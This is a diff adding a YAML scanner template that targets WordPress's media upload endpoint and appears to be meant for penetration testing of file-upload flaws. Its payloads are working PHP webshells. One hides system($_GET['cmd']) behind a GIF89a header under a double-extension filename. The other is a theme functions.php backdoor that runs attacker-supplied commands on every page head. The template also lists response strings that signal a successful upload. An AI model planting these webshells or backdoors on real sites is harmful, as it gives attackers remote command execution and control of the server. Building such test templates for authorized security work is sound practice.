@@ -1,0 +1,44 @@
+name: "WordPress Media Upload"
+description: "Tests WordPress media upload endpoints for file upload vulnerabilities"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "php"
+
+target:
+  endpoint: "/wp-admin/media-new.php"
+  method: "POST"
+  param: "async-upload"
+
+headers:
+  User-Agent: "Mozilla/5.0"
+  X-Requested-With: "XMLHttpRequest"
+
+form_data:
+  action: "upload-attachment"
+  post_id: "0"
+
+payloads:
+  - name: "PHP webshell disguised as image"
+    filename: "wp_shell.gif.php"
+    extension: ".php"
+    content_type: "image/gif"
+    body: |
+      GIF89a
+      <?php system($_GET['cmd']); ?>
+    tags: ["wordpress", "php", "webshell", "gif"]
+
+  - name: "PHP in theme functions"
+    filename: "functions.php"
+    extension: ".php"
+    body: |
+      <?php add_action('wp_head', function(){ system($_GET['cmd']); }); ?>
+    tags: ["wordpress", "theme", "backdoor"]
+
+success_indicators:
+  - "File uploaded successfully"
+  - "Media uploaded"
+  - "Attachment created"
+
+failure_indicators:
+  - "Sorry, this file type is not permitted"
+  - "Security check failed"
